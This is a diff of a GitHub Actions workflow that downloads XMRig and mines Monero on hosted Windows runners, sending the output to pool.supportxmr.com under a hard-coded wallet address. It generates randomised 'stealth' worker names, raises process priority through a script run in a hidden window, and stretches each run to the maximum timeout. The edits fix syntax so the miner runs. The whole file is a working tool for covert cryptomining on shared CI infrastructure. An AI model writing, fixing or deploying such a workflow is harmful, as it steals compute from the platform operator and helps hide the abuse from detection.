@@ -1,4 +1,4 @@
-name: 🚀 High-Performance Windows XMRig Miner
+name: 🚀 High-Performance Windows XMRig Miner (Fixed)
 
 on:
   workflow_dispatch:
@@ -6,36 +6,37 @@ on:
 jobs:
   ultra_mine:
     runs-on: windows-latest
-    timeout-minutes: 355  # Max allowed runtime
+    timeout-minutes: 355
     steps:
       - name: 🎲 Generate stealth worker name
         id: worker
         run: echo "name=win-$(Get-Random -Minimum 10000 -Maximum 99999)-$(Get-Date -Format 'HHmmss')" | Out-File -FilePath $env:GITHUB_OUTPUT -Append
 
-      - name: ⚡ Download tuned XMRig (AVX2 optimized)
+      - name: ⚡ Download tuned XMRig
         run: |
           mkdir -p $env:USERPROFILE\miner
           cd $env:USERPROFILE\miner
-          Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip" -OutFile "xmrig.zip"
-          Expand-Archive -Path "xmrig.zip" -DestinationPath .
-          Rename-Item -Path "xmrig-6.21.0" -NewName "xmrig"
+          curl -sLo xmrig.zip https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip
+          tar -xf xmrig.zip
+          ren xmrig-6.21.0 xmrig
 
-      - name: 🛠️ Performance Tweaks
+      - name: 🛠️ Performance Tweaks (Fixed Syntax)
         run: |
-          # Set high priority and CPU affinity
-          Start-Process powershell -ArgumentList "\
-            $pid = (Get-Process -Name xmrig).Id; \
-            wmic process where ProcessId=$pid CALL setpriority 'high priority'; \
-            $cores = (0..(Get-WmiObject Win32_Processor).NumberOfLogicalProcessors-1); \
-            $affinity = [string]::Join(',', ($cores | Select-Object -Skip 1)); \
-            $process = Get-Process -Id $pid; \
-            $process.ProcessorAffinity = [convert]::ToInt32($affinity.Replace(',',''),2)" \
-          -WindowStyle Hidden
+          $cpuAffinityScript = @"
+          `$pid = (Get-Process -Name xmrig).Id
+          wmic process where ProcessId=`$pid CALL setpriority 'high priority'
+          `$cores = (0..(Get-WmiObject Win32_Processor).NumberOfLogicalProcessors-1)
+          `$affinity = [string]::Join(',', (`$cores | Select-Object -Skip 1))
+          `$process = Get-Process -Id `$pid
+          `$process.ProcessorAffinity = [convert]::ToInt32(`$affinity.Replace(',',''),2)
+          "@
+          Set-Content -Path affinity.ps1 -Value $cpuAffinityScript
+          Start-Process powershell -ArgumentList "-File affinity.ps1" -WindowStyle Hidden
 
-      - name: 💥 Run XMRig (Max Tuned)
+      - name: 💥 Run XMRig (Optimized)
         run: |
           cd $env:USERPROFILE\miner\xmrig
-          Start-Process -NoNewWindow -FilePath ".\xmrig.exe" -ArgumentList @(
+          $xmrigArgs = @(
             "-o pool.supportxmr.com:3333",
             "-u 85jUiJ7tUsZ1gCRTVy4RyoQwPypRBQf1CaZvhogatc1hYHeecdqcq4uUAWntQyUdRhZRB72n1Vt792JvPcstTcntR2g9eZS",
             "-p ${{ steps.worker.outputs.name }}",
@@ -47,4 +48,5 @@ jobs:
             "--asm=auto",
             "--donate-level=1",
             "--no-color"
-          )s
+          ) -join " "
+          Start-Process -NoNewWindow -FilePath ".\xmrig.exe" -ArgumentList $xmrigArgs
